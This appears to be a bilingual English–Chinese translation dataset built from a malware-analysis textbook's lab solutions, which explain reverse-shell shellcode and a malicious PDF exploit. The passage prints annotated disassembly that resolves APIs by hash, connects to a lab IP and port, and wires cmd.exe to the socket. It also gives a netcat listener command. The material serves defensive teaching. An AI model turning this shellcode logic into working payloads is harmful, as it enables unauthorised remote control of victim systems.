- en: 0040703D inc edi
  id: totrans-6624
  prefs: []
  type: TYPE_NORMAL
  zh: 0040703D inc edi
- en: 0040703E loopw loc_40703B
  id: totrans-6625
  prefs: []
  type: TYPE_NORMAL
  zh: 0040703E loopw loc_40703B
- en: 00407041 jmp short near ptr unk_407048 
  id: totrans-6626
  prefs: []
  type: TYPE_NORMAL
  zh: 00407041 jmp short near ptr unk_407048 
- en: '*Listing 19-4L:* Lab19-02.exe *decode loop*'
  id: totrans-6627
  prefs: []
  type: TYPE_NORMAL
  zh: '*Listing 19-4L:* Lab19-02.exe *decode loop*'
- en: The shellcode payload begins at 0x407048\. Set a breakpoint on the jmp instruction
    at  in Listing 19-4L, and let the code run. The shellcode payload will be decoded
    and available for analysis.
  id: totrans-6628
  prefs: []
  type: TYPE_NORMAL
  zh: Shellcode有效负载从0x407048开始。在列表19-4L中的处的jmp指令上设置断点，并运行代码。Shellcode有效负载将被解码并可用于分析。
- en: The code performs a call/pop at  in Listing 19-5L to obtain the address of
    the function hashes located at 0x4071bb. Remember that all of the code listings
    that follow show disassembly of the decoded bytes, so viewing the payload prior
    to letting the decode loop run will show different values than those in the listings.
  id: totrans-6629
  prefs: []
  type: TYPE_NORMAL
  zh: 代码在列表19-5L中的处执行了call/pop操作，以获取位于0x4071bb处的函数哈希地址。请记住，所有随后的代码列表都显示了解码字节的反汇编，因此在解码循环运行之前查看有效负载将显示与列表中不同的值。
- en: 004071B6 call loc_4070E3 
  id: totrans-6630
  prefs: []
  type: TYPE_NORMAL
  zh: 004071B6 call loc_4070E3 
- en: 004071BB dd 0EC0E4E8Eh ; kernel32.dll:LoadLibraryA 004071BF dd 16B3FE72h ; kernel32.dll:CreateProcessA
    004071C3 dd 78B5B983h ; kernel32.dll:TerminateProcess 004071C7 dd 7B8F17E6h ;
    kernel32.dll:GetCurrentProcess 004071CB dd 3BFCEDCBh ; ws2_32.dll:WSAStartup 004071CF
    dd 0ADF509D9h ; ws2_32.dll:WSASocketA 004071D3 dd 60AAF9ECh ; ws2_32.dll:connect
  id: totrans-6631
  prefs: []
  type: TYPE_NORMAL
  zh: 004071BB dd 0EC0E4E8Eh ; kernel32.dll:LoadLibraryA 004071BF dd 16B3FE72h ; kernel32.dll:CreateProcessA
    004071C3 dd 78B5B983h ; kernel32.dll:TerminateProcess 004071C7 dd 7B8F17E6h ;
    kernel32.dll:GetCurrentProcess 004071CB dd 3BFCEDCBh ; ws2_32.dll:WSAStartup 004071CF
    dd 0ADF509D9h ; ws2_32.dll:WSASocketA 004071D3 dd 60AAF9ECh ; ws2_32.dll:connect
- en: '*Listing 19-5L: Shellcode hash array*'
  id: totrans-6632
  prefs: []
  type: TYPE_NORMAL
  zh: '*Listing 19-5L: Shellcode hash array*'
- en: Next, the shellcode processes the array of symbol hashes, as shown in Listing
    19-6L. It uses the same findKernel32Base and findSymbolByHash as described in
    Chapter 19 and Lab 19-1\. It loads the next DWORD containing a symbol hash at
    , calls findSymbolByHash, and stores the result back to the same location at
    . This turns the array of hash values into a function pointer array.
  id: totrans-6633
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，shellcode处理符号哈希数组，如列表19-6L所示。它使用与第19章和Lab 19-1中描述的相同的findKernel32Base和findSymbolByHash。它在处加载包含符号哈希的下一个DWORD，调用findSymbolByHash，并将结果存储回同一位置。这将哈希值数组转换为函数指针数组。
- en: 004070E3 pop esi
  id: totrans-6634
  prefs: []
  type: TYPE_NORMAL
  zh: 004070E3 pop esi
- en: 004070E4 mov ebx, esi
  id: totrans-6635
  prefs: []
  type: TYPE_NORMAL
  zh: 004070E4 mov ebx, esi
- en: 004070E6 mov edi, esi
  id: totrans-6636
  prefs: []
  type: TYPE_NORMAL
  zh: 004070E6 mov edi, esi
- en: 004070E8 call findKernel32Base
  id: totrans-6637
  prefs: []
  type: TYPE_NORMAL
  zh: 004070E8 call findKernel32Base
- en: 004070ED mov edx, eax
  id: totrans-6638
  prefs: []
  type: TYPE_NORMAL
  zh: 004070ED mov edx, eax
- en: 004070EF mov ecx, 4 C02 ; 4 symbols in kernel32
  id: totrans-6639
  prefs: []
  type: TYPE_NORMAL
  zh: 004070EF mov ecx, 4 C02 ; 4 symbols in kernel32
- en: '004070F4 loc_4070F4:'
  id: totrans-6640
  prefs: []
  type: TYPE_NORMAL
  zh: '004070F4 loc_4070F4:'
- en: 004070F4 lodsd 
  id: totrans-6641
  prefs: []
  type: TYPE_NORMAL
  zh: 004070F4 lodsd 
- en: '**700**'
  id: totrans-6642
  prefs: []
  type: TYPE_NORMAL
  zh: '**700**'
- en: Appendix C
  id: totrans-6643
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6644
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 004070F5 push eax
  id: totrans-6645
  prefs: []
  type: TYPE_NORMAL
  zh: 004070F5 push eax
- en: 004070F6 push edx
  id: totrans-6646
  prefs: []
  type: TYPE_NORMAL
  zh: 004070F6 push edx
- en: 004070F7 call findSymbolByHash
  id: totrans-6647
  prefs: []
  type: TYPE_NORMAL
  zh: 004070F7 call findSymbolByHash
- en: 004070FC stosd 
  id: totrans-6648
  prefs: []
  type: TYPE_NORMAL
  zh: 004070FC stosd 
- en: 004070FD loop loc_4070F4
  id: totrans-6649
  prefs: []
  type: TYPE_NORMAL
  zh: 004070FD loop loc_4070F4
- en: '*Listing 19-6L: Hash array processing*'
  id: totrans-6650
  prefs: []
  type: TYPE_NORMAL
  zh: '*Listing 19-6L: Hash array processing*'
- en: The shellcode constructs the string "ws2_32" in Listing 19-7L on the stack by
    pushing two DWORD values at . The current ESP is passed as the argument to LoadLibraryA
    at  to load the *ws2_32.dll* library. This is a common trick to form short strings
    the shellcode needs while it executes. The shellcode then proceeds to process
    the three remaining hash values that reside in *ws2_32.dll* at .
  id: totrans-6651
  prefs: []
  type: TYPE_NORMAL
  zh: Shellcode通过在列表19-7L的堆栈上推送两个DWORD值来构建字符串"ws2_32"。它将当前的ESP作为LoadLibraryA的参数传递到以加载*ws2_32.dll*库。这是一个常见的技巧，在shellcode执行时形成所需的短字符串。然后shellcode继续处理位于*ws2_32.dll*中的剩余三个哈希值。
- en: 004070FF push 3233h ; "32\x00" 
  id: totrans-6652
  prefs: []
  type: TYPE_NORMAL
  zh: 004070FF push 3233h ; "32\x00" 
- en: 00407104 push 5F327377h ; "ws2_"
  id: totrans-6653
  prefs: []
  type: TYPE_NORMAL
  zh: 00407104 push 5F327377h ; "ws2_"
- en: 00407109 push esp
  id: totrans-6654
  prefs: []
  type: TYPE_NORMAL
  zh: 00407109 push esp
- en: 0040710A call dword ptr [ebx] ; LoadLibraryA 
  id: totrans-6655
  prefs: []
  type: TYPE_NORMAL
  zh: 0040710A call dword ptr [ebx] ; LoadLibraryA 
- en: 0040710C mov edx, eax
  id: totrans-6656
  prefs: []
  type: TYPE_NORMAL
  zh: 0040710C mov edx, eax
- en: 0040710E mov ecx, 3 ; 3 symbols in ws2_32 
  id: totrans-6657
  prefs: []
  type: TYPE_NORMAL
  zh: 0040710E mov ecx, 3 ; 3 symbols in ws2_32 
- en: '00407113 loc_407113:'
  id: totrans-6658
  prefs: []
  type: TYPE_NORMAL
  zh: '00407113 loc_407113:'
- en: 00407113 lodsd
  id: totrans-6659
  prefs: []
  type: TYPE_NORMAL
  zh: 00407113 lodsd
- en: 00407114 push eax
  id: totrans-6660
  prefs: []
  type: TYPE_NORMAL
  zh: 00407114 push eax
- en: 00407115 push edx
  id: totrans-6661
  prefs: []
  type: TYPE_NORMAL
  zh: 00407115 push edx
- en: 00407116 call findSymbolByHash
  id: totrans-6662
  prefs: []
  type: TYPE_NORMAL
  zh: 00407116 call findSymbolByHash
- en: 0040711B stosd
  id: totrans-6663
  prefs: []
  type: TYPE_NORMAL
  zh: 0040711B stosd
- en: 0040711C loop loc_407113
  id: totrans-6664
  prefs: []
  type: TYPE_NORMAL
  zh: 0040711C loop loc_407113
- en: '*Listing 19-7L: Importing ws2_32*'
  id: totrans-6665
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 19-7L：导入 ws2_32*'
- en: Listing 19-8L shows the socket-creation code. The current ESP is masked with
    EAX at  to ensure that the stack is properly aligned for structures used by the
    Winsock library. The shellcode calls WSAStartup at  to initialize the library
    before any other networking function calls are made. It then calls WSASocketA
    at  to create a TCP socket. It relies on the value in EAX being 0, and then increments
    it to create the correct arguments to WSASocketA. The type value is 1 (SOC_STREAM),
    and the af value is 2 (AF_INET).
  id: totrans-6666
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 19-8L 展示了创建套接字的代码。当前的 ESP 通过 EAX 进行屏蔽以确保堆栈正确对齐，以便用于 Winsock 库的结构。shellcode
    在调用任何其他网络功能调用之前调用 WSAStartup 初始化库。然后调用 WSASocketA 创建 TCP 套接字。它依赖于 EAX 中的值是 0，然后将其增加以创建
    WSASocketA 的正确参数。类型值是 1（SOC_STREAM），af 值是 2（AF_INET）。
- en: 0040711E sub esp, 230h
  id: totrans-6667
  prefs: []
  type: TYPE_NORMAL
  zh: 0040711E sub esp, 230h
- en: 00407124 mov eax, 0FFFFFFF0h
  id: totrans-6668
  prefs: []
  type: TYPE_NORMAL
  zh: 00407124 mov eax, 0FFFFFFF0h
- en: 00407129 and esp, eax 
  id: totrans-6669
  prefs: []
  type: TYPE_NORMAL
  zh: 00407129 and esp, eax 
- en: 0040712B push esp
  id: totrans-6670
  prefs: []
  type: TYPE_NORMAL
  zh: 0040712B push esp
- en: 0040712C push 101h
  id: totrans-6671
  prefs: []
  type: TYPE_NORMAL
  zh: 0040712C push 101h
- en: 00407131 call dword ptr [ebx+10h] ; WSAStartup 
  id: totrans-6672
  prefs: []
  type: TYPE_NORMAL
  zh: 00407131 call dword ptr [ebx+10h] ; WSAStartup 
- en: '**1 9**'
  id: totrans-6673
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 9**'
- en: 00407134 test eax, eax
  id: totrans-6674
  prefs: []
  type: TYPE_NORMAL
  zh: 00407134 test eax, eax
- en: 00407136 jnz short loc_4071AA
  id: totrans-6675
  prefs: []
  type: TYPE_NORMAL
  zh: 00407136 jnz short loc_4071AA
- en: 00407138 push eax
  id: totrans-6676
  prefs: []
  type: TYPE_NORMAL
  zh: 00407138 push eax
- en: 00407139 push eax
  id: totrans-6677
  prefs: []
  type: TYPE_NORMAL
  zh: 00407139 push eax
- en: 0040713A push eax
  id: totrans-6678
  prefs: []
  type: TYPE_NORMAL
  zh: 0040713A push eax
- en: Solutions to Labs
  id: totrans-6679
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**701**'
  id: totrans-6680
  prefs: []
  type: TYPE_NORMAL
  zh: '**701**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6681
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '0040713B push eax ; protocol 0: IPPROTO_IP'
  id: totrans-6682
  prefs: []
  type: TYPE_NORMAL
  zh: '0040713B push eax ; 协议 0: IPPROTO_IP'
- en: 0040713C inc eax
  id: totrans-6683
  prefs: []
  type: TYPE_NORMAL
  zh: 0040713C inc eax
- en: '0040713D push eax ; type 1: SOCK_STREAM'
  id: totrans-6684
  prefs: []
  type: TYPE_NORMAL
  zh: 0040713D push eax ; 类型 1：SOCK_STREAM
- en: 0040713E inc eax
  id: totrans-6685
  prefs: []
  type: TYPE_NORMAL
  zh: 0040713E inc eax
- en: '0040713F push eax ; af 2: AF_INET'
  id: totrans-6686
  prefs: []
  type: TYPE_NORMAL
  zh: '0040713F push eax ; af 2: AF_INET'
- en: 00407140 call dword ptr [ebx+14h] ; WSASocketA 
  id: totrans-6687
  prefs: []
  type: TYPE_NORMAL
  zh: 00407140 call dword ptr [ebx+14h] ; WSASocketA 
- en: 00407143 cmp eax, 0FFFFFFFFh
  id: totrans-6688
  prefs: []
  type: TYPE_NORMAL
  zh: 00407143 cmp eax, 0FFFFFFFFh
- en: 00407148 jz short loc_4071AA
  id: totrans-6689
  prefs: []
  type: TYPE_NORMAL
  zh: 00407148 jz short loc_4071AA
- en: '*Listing 19-8L: Socket creation*'
  id: totrans-6690
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 19-8L：套接字创建*'
- en: 'Listing 19-9L shows the shellcode creating a struct sockaddr_in on the stack
    by pushing two DWORD values. The first at  is the value 2C8A8C0h. This is the
    network-byte-order value of the IP address the shellcode will connect to: 192.168.200.2\.
    The value at  is 12340002h, which is the sin_family (2: AF_INET) and sin_port
    values: 13330 (0x3412) in network-byte order. This sockaddr_in is passed to the
    call to connect at . Storing the IP address and port this way is extremely compact
    and makes static analysis much more difficult when trying to identify network
    hosts.'
  id: totrans-6691
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 19-9L 展示了通过推送两个 DWORD 值在堆栈上创建 struct sockaddr_in 的 shellcode。第一个值是 2C8A8C0h。这是
    shellcode 将连接到的 IP 地址的网络字节序值：192.168.200.2。第二个值是 12340002h，它是 sin_family（2：AF_INET）和
    sin_port 的值：13330（0x3412）的网络字节序。这个 sockaddr_in 被传递给 connect 调用。以这种方式存储 IP 地址和端口非常紧凑，使得在尝试识别网络主机时静态分析变得更加困难。
- en: 0040714A mov esi, eax
  id: totrans-6692
  prefs: []
  type: TYPE_NORMAL
  zh: 0040714A mov esi, eax
- en: '0040714C push 2C8A8C0h  ; Server IP: 192.168.200.2 (c0.a8.c8.02) 0040714C
    ; in nbo: 0x02c8a8c0'
  id: totrans-6693
  prefs: []
  type: TYPE_NORMAL
  zh: 0040714C push 2C8A8C0h  ; 服务器 IP：192.168.200.2 (c0.a8.c8.02) 0040714C ; 在 nbo
    中：0x02c8a8c0
- en: '00407151 push 12340002h  ; Server Port: 13330 (0x3412), AF_INET (2) 00407151
    ; in nbo: 0x12340002'
  id: totrans-6694
  prefs: []
  type: TYPE_NORMAL
  zh: 00407151 push 12340002h  ; 服务器端口：13330（0x3412），AF_INET（2） 00407151 ; 在 nbo
    中：0x12340002
- en: 00407156 mov ecx, esp
  id: totrans-6695
  prefs: []
  type: TYPE_NORMAL
  zh: 00407156 mov ecx, esp
- en: 00407158 push 10h ; sizeof sockaddr_in
  id: totrans-6696
  prefs: []
  type: TYPE_NORMAL
  zh: 00407158 push 10h ; sockaddr_in 大小
- en: 0040715D push ecx ; sockaddr_in pointer 0040715E push eax
  id: totrans-6697
  prefs: []
  type: TYPE_NORMAL
  zh: 0040715D push ecx ; sockaddr_in 指针 0040715E push eax
- en: 0040715F call dword ptr [ebx+18h] ; connect 
  id: totrans-6698
  prefs: []
  type: TYPE_NORMAL
  zh: 0040715F call dword ptr [ebx+18h] ; connect 
- en: 00407162 test eax, eax
  id: totrans-6699
  prefs: []
  type: TYPE_NORMAL
  zh: 00407162 test eax, eax
- en: 00407164 jnz short loc_4071AA
  id: totrans-6700
  prefs: []
  type: TYPE_NORMAL
  zh: 00407164 jnz short loc_4071AA
- en: '*Listing 19-9L: Socket connection*'
  id: totrans-6701
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 19-9L：套接字连接*'
- en: Listing 19-10L shows the shellcode responsible for creating the *cmd.exe* process.
    The code stores the command to execute ("cmd\x00") on the stack with a simple
    push at , and then saves the current ESP as a pointer for later use. The shellcode
    then prepares to call CreateProcessA. Most of the arguments are 0 (the contents
    of ECX), but note that at , bInheritHandles is 1, indicating that file handles
    opened by the shellcode will be available to the child process.
  id: totrans-6702
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 19-10L 展示了负责创建 *cmd.exe* 进程的 shellcode。代码通过简单的推送将执行命令（"cmd\x00"）存储在堆栈上，然后保存当前的
    ESP 作为后续使用的指针。shellcode 然后准备调用 CreateProcessA。大多数参数都是 0（ECX 的内容），但请注意，在  处，bInheritHandles
    是 1，表示 shellcode 打开的文件句柄将可用于子进程。
- en: 00407166 push 646D63h ; "cmd\x00" 
  id: totrans-6703
  prefs: []
  type: TYPE_NORMAL
  zh: 00407166 push 646D63h ; "cmd\x00" 
- en: 0040716B mov [ebx+1Ch], esp
  id: totrans-6704
  prefs: []
  type: TYPE_NORMAL
  zh: 0040716B mov [ebx+1Ch], esp
- en: 0040716E sub esp, 54h
  id: totrans-6705
  prefs: []
  type: TYPE_NORMAL
  zh: 0040716E sub esp, 54h
- en: 00407174 xor eax, eax
  id: totrans-6706
  prefs: []
  type: TYPE_NORMAL
  zh: 00407174 xor eax, eax
- en: 00407176 mov ecx, 15h
  id: totrans-6707
  prefs: []
  type: TYPE_NORMAL
  zh: 00407176 mov ecx, 15h
- en: 0040717B lea edi, [esp]
  id: totrans-6708
  prefs: []
  type: TYPE_NORMAL
  zh: 0040717B lea edi, [esp]
- en: 0040717E rep stosd
  id: totrans-6709
  prefs: []
  type: TYPE_NORMAL
  zh: 0040717E rep stosd
- en: 00407180 mov byte ptr [esp+10h], 44h ; sizeof(STARTUPINFO) 
  id: totrans-6710
  prefs: []
  type: TYPE_NORMAL
  zh: 00407180 mov byte ptr [esp+10h], 44h ; sizeof(STARTUPINFO) 
- en: 00407185 inc byte ptr [esp+3Ch] ; STARTF_USESHOWWINDOW 
  id: totrans-6711
  prefs: []
  type: TYPE_NORMAL
  zh: 00407185 inc byte ptr [esp+3Ch] ; STARTF_USESHOWWINDOW 
- en: '**702**'
  id: totrans-6712
  prefs: []
  type: TYPE_NORMAL
  zh: '**702**'
- en: Appendix C
  id: totrans-6713
  prefs: []
  type: TYPE_NORMAL
  zh: Appendix C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6714
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 00407189 inc byte ptr [esp+3Dh] ; STARTF_USESTDHANDLES
  id: totrans-6715
  prefs: []
  type: TYPE_NORMAL
  zh: 00407189 inc byte ptr [esp+3Dh] ; STARTF_USESTDHANDLES
- en: 0040718D mov eax, esi 
  id: totrans-6716
  prefs: []
  type: TYPE_NORMAL
  zh: 0040718D mov eax, esi 
- en: 0040718F lea edi, [esp+48h] ; &hStdInput 
  id: totrans-6717
  prefs: []
  type: TYPE_NORMAL
  zh: 0040718F lea edi, [esp+48h] ; &hStdInput 
- en: 00407193 stosd ; hStdInput := socket 00407194 stosd ; hStdOutput := socket 00407195
    stosd ; hStdError := socket 00407196 lea eax, [esp+10h]
  id: totrans-6718
  prefs: []
  type: TYPE_NORMAL
  zh: 00407193 stosd ; hStdInput := socket 00407194 stosd ; hStdOutput := socket 00407195
    stosd ; hStdError := socket 00407196 lea eax, [esp+10h]
- en: 0040719A push esp ; lpProcessInformation 0040719B push eax ; lpStartupInfo
  id: totrans-6719
  prefs: []
  type: TYPE_NORMAL
  zh: 0040719A push esp ; lpProcessInformation 0040719B push eax ; lpStartupInfo
- en: 0040719C push ecx
  id: totrans-6720
  prefs: []
  type: TYPE_NORMAL
  zh: 0040719C push ecx
- en: 0040719D push ecx
  id: totrans-6721
  prefs: []
  type: TYPE_NORMAL
  zh: 0040719D push ecx
- en: 0040719E push ecx
  id: totrans-6722
  prefs: []
  type: TYPE_NORMAL
  zh: 0040719E push ecx
- en: 0040719F push 1 ; bInheritHandles := True 
  id: totrans-6723
  prefs: []
  type: TYPE_NORMAL
  zh: 0040719F push 1 ; bInheritHandles := True 
- en: 004071A1 push ecx
  id: totrans-6724
  prefs: []
  type: TYPE_NORMAL
  zh: 004071A1 push ecx
- en: 004071A2 push ecx
  id: totrans-6725
  prefs: []
  type: TYPE_NORMAL
  zh: 004071A2 push ecx
- en: '004071A3 push dword ptr [ebx+1Ch] ; lpCommandLine: "cmd"'
  id: totrans-6726
  prefs: []
  type: TYPE_NORMAL
  zh: '004071A3 push dword ptr [ebx+1Ch] ; lpCommandLine: "cmd"'
- en: 004071A6 push ecx
  id: totrans-6727
  prefs: []
  type: TYPE_NORMAL
  zh: 004071A6 push ecx
- en: 004071A7 call dword ptr [ebx+4] ; CreateProcessA
  id: totrans-6728
  prefs: []
  type: TYPE_NORMAL
  zh: 004071A7 call dword ptr [ebx+4] ; CreateProcessA
- en: '*Listing 19-10L: Reverse shell creation*'
  id: totrans-6729
  prefs: []
  type: TYPE_NORMAL
  zh: '*Listing 19-10L: Reverse shell creation*'
- en: The STARTUPINFO struct is initialized on the stack, including the size at .
  id: totrans-6730
  prefs: []
  type: TYPE_NORMAL
  zh: The STARTUPINFO struct is initialized on the stack, including the size at .
- en: The dwFlags field is set to STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES at .
  id: totrans-6731
  prefs: []
  type: TYPE_NORMAL
  zh: The dwFlags field is set to STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES at .
- en: STARTF_USESHOWWINDOW indicates that the STARTUPINFO.wShowWindow field is valid.
  id: totrans-6732
  prefs: []
  type: TYPE_NORMAL
  zh: STARTF_USESHOWWINDOW indicates that the STARTUPINFO.wShowWindow field is valid.
- en: This is zero-initialized, so the new process won’t be visible. STARTF_USESTDHANDLES
  id: totrans-6733
  prefs: []
  type: TYPE_NORMAL
  zh: This is zero-initialized, so the new process won’t be visible. STARTF_USESTDHANDLES
- en: indicates that the STARTUPINFO.hStdInput, STARTUPINFO.hStdOutput, and STARTUPINFO
  id: totrans-6734
  prefs: []
  type: TYPE_NORMAL
  zh: indicates that the STARTUPINFO.hStdInput, STARTUPINFO.hStdOutput, and STARTUPINFO
- en: .hStdError fields are valid handles for the child process to use.
  id: totrans-6735
  prefs: []
  type: TYPE_NORMAL
  zh: .hStdError fields are valid handles for the child process to use.
- en: The shellcode moves the socket handle into EAX at  and loads the address of
    hStdInput at . The three stosd instructions store the socket handle in the three
    handle fields of the STARTUPINFO structure. This means that the new *cmd.exe*
    process will use the socket for all of its standard I/O. (This is a common method
    that was shown in Chapter 7.)
  id: totrans-6736
  prefs: []
  type: TYPE_NORMAL
  zh: The shellcode moves the socket handle into EAX at  and loads the address of
    hStdInput at . The three stosd instructions store the socket handle in the three
    handle fields of the STARTUPINFO structure. This means that the new *cmd.exe*
    process will use the socket for all of its standard I/O. (This is a common method
    that was shown in Chapter 7.)
- en: 'You can test connections to the control server by running Netcat on a host
    with the IP address 192.168.200.2 with this command: nc -l -p 13330'
  id: totrans-6737
  prefs: []
  type: TYPE_NORMAL
  zh: 'You can test connections to the control server by running Netcat on a host
    with the IP address 192.168.200.2 with this command: nc -l -p 13330'
- en: Once Netcat is running, run *Lab19-02.exe* on another system. If you have set
    up networking correctly, the victim machine will connect to 192.168.200.2, and
    Netcat will show the Windows command-line banner. You can enter commands there
    as if you were sitting at the victim’s system.
  id: totrans-6738
  prefs: []
  type: TYPE_NORMAL
  zh: Once Netcat is running, run *Lab19-02.exe* on another system. If you have set
    up networking correctly, the victim machine will connect to 192.168.200.2, and
    Netcat will show the Windows command-line banner. You can enter commands there
    as if you were sitting at the victim’s system.
- en: '**Lab 19-3 Solutions**'
  id: totrans-6739
  prefs: []
  type: TYPE_NORMAL
  zh: '**Lab 19-3 Solutions**'
- en: '**1 9**'
  id: totrans-6740
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 9**'
- en: '***Short Answers***'
  id: totrans-6741
  prefs: []
  type: TYPE_NORMAL
  zh: '***Short Answers***'
- en: 1\.
  id: totrans-6742
  prefs: []
  type: TYPE_NORMAL
  zh: 1\.
- en: 'The PDF contains an example of CVE-2008-2992: buffer overflow related to Adobe
    Reader’s *util.printf* JavaScript implementation.'
  id: totrans-6743
  prefs: []
  type: TYPE_NORMAL
  zh: 'The PDF contains an example of CVE-2008-2992: buffer overflow related to Adobe
    Reader’s *util.printf* JavaScript implementation.'
- en: 2\.
  id: totrans-6744
  prefs: []
  type: TYPE_NORMAL
  zh: 2\.
- en: The shellcode is encoded using JavaScript’s percent-encoding and is stored along
    with the JavaScript in the PDF.
  id: totrans-6745
  prefs: []
  type: TYPE_NORMAL
  zh: The shellcode is encoded using JavaScript’s percent-encoding and is stored along
    with the JavaScript in the PDF.
- en: Solutions to Labs
  id: totrans-6746
  prefs: []
  type: TYPE_NORMAL
  zh: Solutions to Labs
- en: '**703**'
  id: totrans-6747
  prefs: []
  type: TYPE_NORMAL
  zh: '**703**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6748
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 3\.
  id: totrans-6749
  prefs: []
  type: TYPE_NORMAL
  zh: 3\.
- en: 'The shellcode manually imports the following functions:'
  id: totrans-6750
  prefs: []
  type: TYPE_NORMAL
  zh: 'The shellcode manually imports the following functions:'
- en: 
  id: totrans-6751
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: LoadLibraryA
  id: totrans-6752
  prefs: []
  type: TYPE_NORMAL
  zh: LoadLibraryA
- en: 
  id: totrans-6753
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: SetFilePointer
  id: totrans-6754
  prefs: []
  type: TYPE_NORMAL
  zh: SetFilePointer
- en: 
  id: totrans-6755
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: CreateProcessA
  id: totrans-6756
  prefs: []
  type: TYPE_NORMAL
  zh: CreateProcessA
- en: 
  id: totrans-6757
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: ReadFile
  id: totrans-6758
  prefs: []
  type: TYPE_NORMAL
  zh: ReadFile
- en: 
  id: totrans-6759
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: TerminateProcess
  id: totrans-6760
  prefs: []
  type: TYPE_NORMAL
  zh: TerminateProcess
- en: 
  id: totrans-6761
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: WriteFile
  id: totrans-6762
  prefs: []
  type: TYPE_NORMAL
  zh: WriteFile
- en: 
  id: totrans-6763
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: GetCurrentProcess
  id: totrans-6764
  prefs: []
  type: TYPE_NORMAL
  zh: GetCurrentProcess
- en: 
  id: totrans-6765
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: CloseHandle
  id: totrans-6766
  prefs: []
  type: TYPE_NORMAL
  zh: CloseHandle
- en: 
  id: totrans-6767
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: GetTempPathA
  id: totrans-6768
  prefs: []
  type: TYPE_NORMAL
  zh: GetTempPathA
- en: 
  id: totrans-6769
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: GlobalAlloc
  id: totrans-6770
  prefs: []
  type: TYPE_NORMAL
  zh: GlobalAlloc
- en: 
  id: totrans-6771
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: SetCurrentDirectoryA
  id: totrans-6772
  prefs: []
  type: TYPE_NORMAL
  zh: SetCurrentDirectoryA
- en: 
  id: totrans-6773
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: GlobalFree
  id: totrans-6774
  prefs: []
  type: TYPE_NORMAL
  zh: GlobalFree
- en: 
  id: totrans-6775
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: CreateFileA
  id: totrans-6776
  prefs: []
  type: TYPE_NORMAL
  zh: CreateFileA
- en: 
  id: totrans-6777
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: ShellExecuteA
  id: totrans-6778
  prefs: []
  type: TYPE_NORMAL
  zh: ShellExecuteA
- en: 
  id: totrans-6779
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: GetFileSize
  id: totrans-6780
  prefs: []
  type: TYPE_NORMAL
  zh: GetFileSize
- en: 4\.
  id: totrans-6781
  prefs: []
  type: TYPE_NORMAL
  zh: 4\.
- en: The shellcode creates the files *%TEMP%\foo.exe* and *%TEMP%\bar.pdf*.
  id: totrans-6782
  prefs: []
  type: TYPE_NORMAL
  zh: The shellcode creates the files *%TEMP%\foo.exe* and *%TEMP%\bar.pdf*.
- en: 5\.
  id: totrans-6783
  prefs: []
  type: TYPE_NORMAL
  zh: 5\.
- en: The shellcode extracts two files stored encoded within the malicious PDF
  id: totrans-6784
  prefs: []
  type: TYPE_NORMAL
  zh: The shellcode extracts two files stored encoded within the malicious PDF
- en: and writes them to the user’s *%TEMP%* directory. It executes the *foo.exe*
    file and opens the *bar.pdf* document with the default handler.
  id: totrans-6785
  prefs: []
  type: TYPE_NORMAL
  zh: 并将它们写入用户的 *%TEMP%* 目录。它执行 *foo.exe* 文件，并使用默认处理程序打开 *bar.pdf* 文档。
- en: '***Detailed Analysis***'
  id: totrans-6786
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: The PDF format mixes text and binary, so simply looking at a PDF with the strings
    command or in a hex or text editor can provide some rudimentary information about
    the contents. However, this is trivially easy for attackers to obfuscate. PDF
    allows objects to be zlib-compressed. You will see /Filter
  id: totrans-6787
  prefs: []
  type: TYPE_NORMAL
  zh: PDF 格式混合了文本和二进制，因此仅使用字符串命令或十六进制或文本编辑器查看 PDF 可以提供一些关于内容的基本信息。然而，攻击者可以轻易地混淆这些信息。PDF
    允许对象使用 zlib 进行压缩。您将看到对象字典中的 /Filter
- en: /FlateDecode as an option in the object dictionary. In these cases, you’ll need
    to rely on other techniques to extract this data. (See Appendix B for recommended
    malicious PDF parsers.)
  id: totrans-6788
  prefs: []
  type: TYPE_NORMAL
  zh: /FlateDecode 作为对象字典中的选项。在这些情况下，您需要依赖其他技术来提取这些数据。（参见附录 B 中推荐的恶意 PDF 解析器。）
- en: Listing 19-11L shows object 9 0 from this PDF. This object contains JavaScript
    that will be executed when the document is opened.
  id: totrans-6789
  prefs: []
  type: TYPE_NORMAL
